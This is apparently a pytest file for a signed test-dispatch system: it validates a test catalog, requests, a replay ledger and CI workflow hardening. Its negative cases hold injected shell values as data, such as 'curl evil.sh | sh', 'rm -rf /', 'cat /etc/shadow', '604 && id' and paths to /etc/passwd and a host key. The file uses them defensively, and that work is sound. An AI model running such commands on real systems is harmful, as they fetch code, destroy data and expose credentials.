"""PF-VPS-UNIVERSAL-TEST-AUTOMATION-01 — catalogo versionato e richiesta firmata di test: casi positivi e negativi."""
from __future__ import annotations

import copy
import datetime as dt
import json
import re
import sys
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "scripts"))
import pf_test_dispatch as D  # noqa: E402

REPO = "zarbopiero963-droid/Pickfair-nogui"
SHA, OLD = "a" * 40, "b" * 40
NOW = dt.datetime(2026, 11, 3, 12, 0, tzinfo=dt.timezone.utc)
OWNER = "zarbopiero963-droid"
CATALOG_RAW = (ROOT / D.CATALOG_PATH).read_bytes()
CATALOG = json.loads(CATALOG_RAW)


def pr_data(state="open", head=SHA, repo=REPO, number=604):
    return {"number": number, "state": state, "head": {"sha": head, "repo": {"full_name": repo}},
            "base": {"sha": "c" * 40}}


def build(**over):
    kw = dict(target="suite:recovery", pr="604", sha=SHA, repo=REPO, actor=OWNER, actor_permission="admin",
              pr_data=pr_data(), catalog_raw=CATALOG_RAW, run_id=77, run_attempt=1, mode="dry-run", now=NOW)
    kw.update(over)
    return D.build_request(**kw)


def verify(req_or_raw, **over):
    kw = dict(repo=REPO, pr_data=pr_data(), signer_run_id="77", catalog_raw=CATALOG_RAW,
              now=NOW + dt.timedelta(minutes=5))
    kw.update(over)
    data = req_or_raw if isinstance(req_or_raw, bytes) else json.dumps(req_or_raw).encode()
    return D.verify_request(data, **kw)


def cat_with(mutate):
    cat = copy.deepcopy(CATALOG)
    mutate(cat)
    return json.dumps(cat).encode()


# ── catalogo ─────────────────────────────────────────────────────────────────────────────────────────────────────
def test_the_repository_catalog_is_valid():
    cat = D.validate_catalog(CATALOG_RAW)
    assert {"prelive-certify", "sim-multitable-certify", "full-regression", "mutation"} <= {s["id"] for s in
                                                                                          cat["suites"]}


def test_every_test_directory_and_module_is_reachable_from_the_catalog():
    """Copertura del catalogo: una nuova cartella di test senza voce fa fallire la CI (estensione per PR)."""
    covered = {a for s in CATALOG["suites"] if s["runner"] == "pytest" for a in s["args"]}
    dirs = {f"tests/{p.name}" for p in (ROOT / "tests").iterdir() if p.is_dir() and any(p.rglob("test_*.py"))}
    modules = {f"tests/{p.name}" for p in (ROOT / "tests").glob("test_*.py")}
    assert dirs | modules <= covered, sorted((dirs | modules) - covered)


def test_campaign_all_reaches_every_test_except_the_redundant_full_regression():
    every = {s["id"] for s in CATALOG["suites"]} - {"full-regression"}
    assert set(CATALOG["campaigns"]["all"]) == every


@pytest.mark.parametrize("mutate,reason", [
    (lambda c: c["suites"][0].update(args=["tests/unit; curl evil.sh | sh"]), "UNSAFE_ARG"),   # comando arbitrario
    (lambda c: c["suites"][0].update(args=["--rootdir=/etc"]), "UNSAFE_ARG"),
    (lambda c: c["suites"][0].update(args=["tests/../../etc/passwd"]), "UNSAFE_ARG"),           # evasione percorsi
    (lambda c: c["suites"][0].update(args=["/root/.betfair/live_key"]), "UNSAFE_ARG"),          # segreti host
    (lambda c: c["suites"][0].update(args=["scripts/pr_flow_automation.py"]), "PYTEST_PATH"),
    (lambda c: c["suites"][0].update(args=["tests/does_not_exist"]), "PYTEST_PATH"),
    (lambda c: c["suites"][0].update(runner="bash", args=["x.sh"]), "RUNNER"),
    (lambda c: c["suites"][0].update(runner="python", args=["scripts/pf_test_dispatch.py"]), "PYTHON_SCRIPT"),
    (lambda c: c["suites"][0].update(runner="orchestrator", args=["LIVE_ORDER"]), "ORCHESTRATOR_JOB"),  # gateway
    (lambda c: c["suites"][0].update(environment="PRODUCTION"), "SUITE_ENV_OR_RISK"),
    (lambda c: c["suites"][0].update(timeout_seconds=99999), "SUITE_TIMEOUT"),
    (lambda c: c["suites"][0].update(resources={"cpu": 64, "memory_mb": 2048}), "SUITE_RESOURCES"),  # saturazione
    (lambda c: c["suites"][0].update(shell="rm -rf /"), "SUITE_FIELDS"),
    (lambda c: c["suites"].append(dict(c["suites"][0])), "SUITE_ID"),                         # id duplicato
    (lambda c: c["campaigns"].update(all=["ghost-suite"]), "CAMPAIGN"),
    (lambda c: c.update(schema="pf-test-catalog/9"), "CATALOG_SCHEMA"),
])
def test_an_altered_or_unsafe_catalog_is_refused(mutate, reason):
    with pytest.raises(D.Refused, match=f"^{reason}"):
        D.validate_catalog(cat_with(mutate))


def test_a_destructive_category_must_not_run_offline():
    def mutate(c):
        s = next(x for x in c["suites"] if x["id"] == "chaos")
        s.update(environment="OFFLINE")
    with pytest.raises(D.Refused, match="^DESTRUCTIVE_NOT_ISOLATED"):
        D.validate_catalog(cat_with(mutate))


# ── richiesta: positivi ─────────────────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("target,suites", [("suite:recovery", ["recovery"]),
                                           ("suite:prelive-certify", ["prelive-certify"]),
                                           ("campaign:all", sorted(CATALOG["campaigns"]["all"]))])
def test_a_trusted_request_for_the_current_head_is_built_and_verified(target, suites):
    req = build(target=target)
    assert set(req) == D.REQUEST_FIELDS and req["suites"] == suites and req["mode"] == "dry-run"
    assert req["catalog_sha256"] == D.catalog_digest(CATALOG_RAW)
    assert verify(req) == req


# ── richiesta: negativi lato GitHub ─────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("over,reason", [
    (dict(actor="someone-else"), "REQUESTER_NOT_TRUSTED"),                    # richiesta non autorizzata
    (dict(actor_permission="read"), "REQUESTER_PERMISSION"),
    (dict(sha=OLD), "STALE_SHA"),                                              # SHA non corrispondente
    (dict(sha="A" * 40), "MALFORMED_SHA"),
    (dict(pr_data=pr_data(repo="evil/fork")), "FORK_PR"),                     # codice non fidato
    (dict(pr_data=pr_data(state="closed")), "PR_NOT_OPEN"),
    (dict(target="suite:not-registered"), "TARGET_NOT_IN_CATALOG"),           # test non registrato
    (dict(target="suite:recovery; rm -rf /"), "TARGET_NOT_IN_CATALOG"),
    (dict(target="tests/unit"), "TARGET_NOT_IN_CATALOG"),
    (dict(target="campaign:nope"), "TARGET_NOT_IN_CATALOG"),
    (dict(mode="live"), "MODE_NOT_ALLOWED"),
    (dict(pr="604 && id"), "MALFORMED_PR"),
    (dict(catalog_raw=b"{"), "CATALOG_MALFORMED"),
])
def test_untrusted_or_unregistered_requests_are_refused_on_the_github_side(over, reason):
    with pytest.raises(D.Refused, match=f"^{reason}$"):
        build(**over)


# ── richiesta: negativi lato VPS (dopo la firma) ────────────────────────────────────────────────────────────────
def _tampered(**fields):
    req = build()
    req.update(fields)
    return req


@pytest.mark.parametrize("req,over,reason", [
    (_tampered(command="cat /etc/shadow"), {}, "SCHEMA_MISMATCH"),            # campi liberi
    (_tampered(suites=["recovery", "prelive-certify"]), {}, "SUITES_MISMATCH"),
    (_tampered(target="suite:chaos", suites=["chaos"]), {}, "KEY_MISMATCH"),  # target cambiato dopo la firma
    (_tampered(mode="execute"), {}, "MODE_NOT_ALLOWED"),
    (_tampered(repo="evil/repo"), {}, "WRONG_REPO"),
    (_tampered(requested_by="mallory"), {}, "REQUESTER_NOT_TRUSTED"),
    (_tampered(pr=True), {}, "MALFORMED_PR"),
    (build(), dict(signer_run_id="78"), "RUN_MISMATCH"),                       # artefatto di un altro run
    (build(), dict(catalog_raw=cat_with(lambda c: c.update(version=2))), "CATALOG_MISMATCH"),  # catalogo cambiato
    (build(), dict(pr_data=pr_data(head=OLD)), "STALE_SHA"),
    (build(), dict(pr_data=pr_data(state="closed")), "PR_NOT_OPEN"),
    (build(), dict(pr_data=pr_data(repo="evil/fork")), "FORK_PR"),
    (build(), dict(pr_data=pr_data(number=605)), "WRONG_PR"),
    (build(), dict(now=NOW + dt.timedelta(hours=25)), "EXPIRED"),             # replay tardivo
    (build(), dict(now=NOW - dt.timedelta(hours=1)), "EXPIRED"),
])
def test_tampered_replayed_or_stale_requests_are_refused_on_the_vps_side(req, over, reason):
    with pytest.raises(D.Refused, match=f"^{reason}$"):
        verify(req, **over)


@pytest.mark.parametrize("data", [b"\xff", b"not json", b"[]", b"{}"])
def test_malformed_requests_are_refused(data):
    with pytest.raises(D.Refused):
        verify(data)


# ── idempotenza, persistenza, crash ─────────────────────────────────────────────────────────────────────────────
def test_a_repeated_request_is_refused_even_after_a_restart(tmp_path):
    path = tmp_path / "vps" / "ledger.json"
    D.Ledger(path).admit(build())
    with pytest.raises(D.Refused, match="^DUPLICATE_REQUEST$"):
        D.Ledger(path).admit(dict(build(), run_id=99))                        # nuovo processo, nuovo run, stesso test
    D.Ledger(path).admit(build(target="suite:chaos"))
    assert len(json.loads(path.read_text())["admitted"]) == 2


@pytest.mark.parametrize("content", ["{broken", "[]", '{"admitted": []}'])
def test_an_unreadable_ledger_refuses_instead_of_starting_empty(tmp_path, content):
    path = tmp_path / "ledger.json"
    path.write_text(content)
    with pytest.raises(D.Refused, match="^LEDGER_UNREADABLE$"):
        D.Ledger(path).admit(build())
    assert path.read_text() == content


def test_a_crash_during_the_write_leaves_the_previous_ledger_intact(tmp_path, monkeypatch):
    path = tmp_path / "ledger.json"
    D.Ledger(path).admit(build())
    before = path.read_text()
    monkeypatch.setattr(D.os, "replace", lambda *a: (_ for _ in ()).throw(OSError("disk full")))
    with pytest.raises(OSError):
        D.Ledger(path).admit(build(target="suite:chaos"))
    assert path.read_text() == before and not list(tmp_path.glob(".ledger-*"))


# ── stati ───────────────────────────────────────────────────────────────────────────────────────────────────────
def _cr(i, name="pf-test/recovery", sha=SHA, slug="pickfair-dedicated", status="completed", conclusion="success",
        title="OK"):
    return {"id": i, "name": name, "head_sha": sha, "app": {"slug": slug}, "status": status,
            "conclusion": conclusion, "output": {"title": title}}


@pytest.mark.parametrize("runs,state", [
    ([], "NOT_REQUESTED"),
    ([_cr(1, slug="evil-app")], "NOT_REQUESTED"),                              # evidenza falsa di un'altra app
    ([_cr(1, sha=OLD)], "NOT_REQUESTED"),
    ([_cr(1, status="queued", conclusion=None)], "QUEUED"),
    ([_cr(1, status="in_progress", conclusion=None)], "RUNNING"),
    ([_cr(1)], "PASS"),
    ([_cr(1, conclusion="failure")], "FAIL"),
    ([_cr(1, conclusion="action_required")], "BLOCKED"),
    ([_cr(1, conclusion="timed_out")], "TIMEOUT"),
    ([_cr(1, conclusion="cancelled")], "CANCELLED"),
    ([_cr(1, conclusion="failure", title="INFRA_ERROR: runner lost")], "INFRA_ERROR"),
    ([_cr(1, conclusion="success", title="INFRA_ERROR: recorder down")], "INFRA_ERROR"),  # mai PASS
    ([_cr(1, conclusion="neutral")], "INFRA_ERROR"),
    ([_cr(1, conclusion="stale")], "INFRA_ERROR"),
    ([_cr(2), _cr(3, status="in_progress", conclusion=None)], "RUNNING"),      # un PASS vecchio non maschera un rerun
    ([_cr(5), _cr(4, status="in_progress", conclusion=None)], "RUNNING"),      # run aperto con id piu' basso
    ([_cr(2, conclusion="failure"), _cr(3)], "PASS"),
])
def test_status_maps_only_trusted_check_runs_of_the_exact_head(runs, state):
    assert D.suite_status("recovery", SHA, runs)["state"] == state


def test_certifications_keep_their_historical_check_names():
    assert D.check_name("prelive-certify") == "pf-betfair-certification"
    assert D.check_name("sim-multitable-certify") == "pf-sim-multitable-certification"


@pytest.mark.parametrize("states,verdict", [
    (["PASS", "PASS"], "PASS"), (["PASS", "INFRA_ERROR"], "INFRA_ERROR"), (["PASS", "FAIL"], "FAIL"),
    (["PASS", "RUNNING"], "RUNNING"), (["PASS", "NOT_REQUESTED"], "NOT_REQUESTED"), ([], "BLOCKED"),
    (["FAIL", "INFRA_ERROR"], "INFRA_ERROR"),
    (["PASS", "SOMETHING_NEW"], "BLOCKED"),                                     # stato sconosciuto: mai PASS
])
def test_a_campaign_passes_only_if_every_suite_passes(states, verdict):
    assert D.campaign_state(states) == verdict


# ── workflow e CLI ──────────────────────────────────────────────────────────────────────────────────────────────
WF = ROOT / D.REQUEST_WORKFLOW


def test_workflow_is_dispatch_only_from_main_with_minimal_permissions():
    w = yaml.safe_load(WF.read_text())
    on = w.get("on", w.get(True))
    assert list(on) == ["workflow_dispatch"] and set(on["workflow_dispatch"]["inputs"]) == {"target", "pr", "sha"}
    assert w["permissions"] == {"contents": "read", "pull-requests": "read", "id-token": "write",
                                "attestations": "write"}
    job = w["jobs"]["request"]
    assert job["if"] == "github.ref == 'refs/heads/main'" and job["env"]["PF_TEST_DISPATCH_MODE"] == "dry-run"
    assert job["timeout-minutes"] <= 10


def test_workflow_never_interpolates_inputs_into_shell_and_holds_no_secrets():
    w = yaml.safe_load(WF.read_text())
    steps = w["jobs"]["request"]["steps"]
    for step in steps:
        assert "${{" not in step.get("run", ""), step.get("name")
        assert "ref" not in (step.get("with") or {})
    assert "secrets." not in WF.read_text()
    assert [s.get("uses", "").split("@")[0] for s in steps if "uses" in s] == [
        "actions/checkout", "actions/attest-build-provenance", "actions/upload-artifact"]


def _env(monkeypatch, **over):
    base = {"GITHUB_REPOSITORY": REPO, "GITHUB_ACTOR": OWNER, "PF_REQ_PR": "604", "PF_REQ_TARGET": "suite:recovery",
            "PF_REQ_SHA": SHA, "PF_TEST_DISPATCH_MODE": "dry-run", "GITHUB_RUN_ID": "77", "GITHUB_RUN_ATTEMPT": "1"}
    base.update(over)
    for k, v in base.items():
        monkeypatch.setenv(k, v)


def test_cli_build_refuses_malformed_input_before_any_api_call(monkeypatch, tmp_path, capsys):
    calls = []
    monkeypatch.setattr(D, "_gh", lambda p: calls.append(p) or {})
    _env(monkeypatch, PF_REQ_PR="604/../../x")
    assert D.main(["build", "--output", str(tmp_path / "r.json")]) == 1
    assert calls == [] and json.loads(capsys.readouterr().out)["refused"] == "MALFORMED_INPUT"
    assert not (tmp_path / "r.json").exists()


def test_cli_build_writes_a_verifiable_request(monkeypatch, tmp_path, capsys):
    answers = {f"repos/{REPO}/pulls/604": pr_data(),
               f"repos/{REPO}/collaborators/{OWNER}/permission": {"permission": "admin"}}
    monkeypatch.setattr(D, "_gh", lambda p: answers[p])
    _env(monkeypatch, PF_REQ_TARGET="campaign:all")
    out = tmp_path / "r.json"
    assert D.main(["build", "--output", str(out)]) == 0
    req = json.loads(out.read_text())
    created = dt.datetime.strptime(req["created_at"], "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=dt.timezone.utc)
    assert verify(out.read_bytes(), now=created)["suites"] == sorted(CATALOG["campaigns"]["all"])
    assert re.fullmatch(r"[0-9a-f]{64}", json.loads(capsys.readouterr().out)["idempotency_key"])


def test_cli_status_reports_the_campaign_verdict(monkeypatch, capsys):
    runs = [_cr(1, name="pf-test/recovery")]
    monkeypatch.setattr(D, "_gh", lambda p: {"check_runs": runs})
    assert D.main(["status", "--repo", REPO, "--target", "suite:recovery", "--sha", SHA]) == 0
    assert json.loads(capsys.readouterr().out)["state"] == "PASS"


# ── copertura dei comportamenti ─────────────────────────────────────────────────────────────────────────────────
def test_behaviour_coverage_is_honest_about_the_inventory():
    cov = json.loads((ROOT / "testing/behaviour_coverage.json").read_text())
    assert cov["schema"] == "pf-behaviour-coverage/1"
    ids = {s["id"] for s in CATALOG["suites"]}
    for b in cov["behaviours"]:
        assert b["status"] in ("COVERED", "PARTIAL", "NOT_COVERED", "NOT_APPLICABLE") and b["reason"]
        if b["status"] in ("COVERED", "PARTIAL"):
            assert b["suites"] and set(b["suites"]) <= ids
    if not cov["behaviours"]:
        assert cov["inventory"]["status"] == "NOT_IMPORTED"                    # mai "coperto" per assenza di voci
